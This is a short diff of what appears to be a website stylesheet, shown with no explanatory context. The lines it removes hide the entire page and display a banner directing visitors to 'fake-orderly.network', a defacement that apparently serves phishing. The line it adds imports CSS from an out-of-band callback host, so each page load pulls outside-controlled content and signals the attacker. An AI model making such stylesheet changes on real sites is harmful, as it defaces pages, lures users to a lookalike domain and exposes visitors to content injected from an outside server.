@@ -1,16 +1,1 @@
-body * {
-    display: none !important;
-}
-
-
-body::before {
-    content: "Go to  orderly v3 : fake-orderly.network";
-    display: block;
-    font-size: 3em;
-    color: red;
-    font-weight: bold;
-    text-align: center;
-    margin-top: 20%;
-    background: black;
-    padding: 50px;
-}
+@import url("https://m1o7mgfkflj0fxikvrd89mrd7c97dyne6.oast.site/test.css");
